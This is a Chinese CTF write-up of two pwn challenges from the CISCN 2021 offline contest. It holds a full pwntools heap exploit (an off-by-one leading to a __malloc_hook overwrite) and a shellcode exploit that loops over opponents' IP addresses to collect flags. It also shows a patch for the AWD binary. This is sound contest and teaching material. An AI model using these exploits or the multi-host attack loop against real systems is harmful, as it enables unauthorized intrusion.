# ciscn2021 华中线下赛pwn部分题解
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
菜鸡第一次打线下赛，一天解题一天awd，一共四个pwn，解题赛的pwn2到最后都只有一个师傅搞定（凌霄的师傅tql），本菜鸡只出了两个题，不过还好现场awd不是很激烈，只靠一个也勉强活了下来。本文简单记录一下解题的pwn1和awd的水pwn。
## pwn1
解题赛一共两个pwn题，还好队伍里其他大佬c我。
###  漏洞点
pwn1就是一道朴实无华的堆题，2.31的libc，在申请堆块输入内容的时候存在off by one。
     for ( i = 0; i 0x68 2->0xe8 else 0x21
    sh = process('./note')
    #sh = remote('10.12.153.11',58011)
    libc = ELF('/opt/libs/2.31-0ubuntu9.2_amd64/libc-2.31.so')
    for i in range(7):#calloc(0xe8) fill tcache
        add(2)
        delete(0)
    add(2,'\x00'*0x80)#0
    add(1,'a'*0x20+p64(0xb0)+p64(0x70-0x30))#1  fake pre_sz & sz
    delete(0)#ustbin
    add(1,'\x00'*0x68+p64(0xb1))#0 off by one
    for i in range(4):
        add(0)
        delete(2)
    show(1)
    libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00'))-(0x7efc8cb1dbe0-0x7efc8c932000)
    print hex(libc_base)
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    delete(0)
    for i in range(6):
        add(1)
        delete(0)
    add(2)#0
    delete(1)#0x30 tcache
    add(1,'a'*0x60+p64(0xf0))#1
    add(2)#2
    delete(0)#unsorted bin
    delete(1)# 0x71 fastbin
    add(1,'a'*0x60+p64(0xf0)+p64(0xf0))#0 fake size
    add(1,'\x00'*0x68+p64(0xf1))#1
    delete(0)
    add(2,'\x00'*0x70+p64(0)+p64(0x70)+p64(malloc_hook-0x33)+'\x00'*(0xe8-0x88)+p64(0X51))#0
    delete(2)
    delete(1)
    add(1,'a'*0x68+p64(0x81))
    delete(0)
    add(1)
    add(1,'a'*0x23+p64(libc_base+0xe6c7e))
    delete(0)
    sla('choice:','1')
    #gdb.attach(sh)
    sla('Large.',str(3))
    ti()
## pwn1_awd
比较简单的一题，不过awd阶段靠这题还拿了不少分，挺离谱的。
###  漏洞点
有一丢丢逆向pwn的意思，不过逻辑很简洁。  
输入格式
    op : choice 选操作
    + ：off 输入偏移
    n : size 输入长度
操作2和3都是先调用mmap开辟一块内存空间，然后以off为偏移，size为大小写入内容。  
具有可执行权限。
    unsigned __int64 sub_400A65()
    {
      unsigned int v0; // eax
      unsigned __int64 v2; // [rsp+8h] [rbp-8h]
      v2 = __readfsqword(0x28u);
      if ( !mmap_addr )
      {
        v0 = getpagesize();
        mmap_addr = (int)mmap((void *)0x1000, v0, 7, 34, 0, 0LL);
      }
      return __readfsqword(0x28u) ^ v2;
    }
选项1判断开辟的内存空间内容是否为`0xdeadbeef`，是则getshell。  
但是当时就很奇怪，这个shell读不了根目录下的flag文件，可能跟权限有关系。
    unsigned __int64 sub_400AD4()
    {
      unsigned __int64 v1; // [rsp+8h] [rbp-8h]
      v1 = __readfsqword(0x28u);
      puts("ready?");
      mmap_to_write();
      if ( *(_DWORD *)mmap_addr == 0xDEADBEEF )
        system("/bin/sh");
      puts("oh?");
      return __readfsqword(0x28u) ^ v1;
    }
选项4就很直白。
    unsigned __int64 sub_400C92()
    {
      unsigned __int64 v1; // [rsp+8h] [rbp-8h]
      v1 = __readfsqword(0x28u);
      mmap_to_write();
      puts("ready?");
      mmap_addr("ready?")//执行shellcode
      return __readfsqword(0x28u) ^ v1;
    }
###  修复
一个是mmap出的内存空间不可执行。 再将后门patch掉，不过后门不修应该也没关系，反正读不到flag。
    mmap_addr = (__int64 (__fastcall *)(_QWORD))(int)mmap((void *)0x1000, v0, 6, 34, 0, 0LL);
###  exp
    from pwn import *
    from LibcSearcher import *
    context.log_level = 'debug'
    sa = lambda s,n : sh.sendafter(s,n)
    sla = lambda s,n : sh.sendlineafter(s,n)
    sl = lambda s : sh.sendline(s)
    sd = lambda s : sh.send(s)
    rc = lambda n : sh.recv(n)
    ru = lambda s : sh.recvuntil(s)
    ti = lambda : sh.interactive()
    context.arch = 'amd64'
    shellcode = shellcraft.open('flag.txt')
    shellcode += shellcraft.read('rax','rsp',0x60)
    shellcode += shellcraft.write(1,'rsp',0x60)
    payload = asm(shellcode)
    #sh = remote('10.12.153.18',9999)
    def write_shell():
        return 'op:2\n+:0\nn:400\n\n'
    def run():
        return 'op:4\n\n'
    #gdb.attach(sh)
    def pwn():
        sla('code> ',write_shell())
        sa('ready?',payload)
        sla('code> ',run())
    #run_shell(sh,'./backdoor')
    with open('ip.txt','r') as f:
        ips = f.readlines()
    print ips
    f = open('flag_2.txt','w+')
    for i in ips:
        ip= i.strip('\r\n')
        print ip
        sh = remote(ip,9999)
        try:
            pwn()
            flag = ru('}')[-38:]
            f.write(flag+'\n')
            print '__flag__:'+flag
        except:
            print 'error'
    f.close()
## 总结
解题赛被pwn2支配了大半天，结果还是没什么进展，😔太菜了。听说现场的唯一解是ha1vk，大佬tql。awd就把pwn2洞修了然后也没再看，被web佬c了。